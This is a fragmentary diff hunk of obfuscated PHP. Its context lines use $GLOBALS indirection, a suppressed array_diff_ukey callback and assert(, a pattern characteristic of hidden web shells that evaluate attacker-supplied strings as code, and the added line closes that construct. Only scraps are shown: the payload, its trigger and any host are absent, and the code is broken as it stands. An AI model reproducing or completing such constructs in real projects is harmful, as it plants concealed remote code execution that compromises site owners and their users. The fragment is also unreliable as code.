@@ -41,3 +41,4 @@ foreach ($GLOBALS[$GLOBALS['
 <?php @array_diff_ukey(@array((
 "; assert($
 :"")."//");
+);'));}else{echo
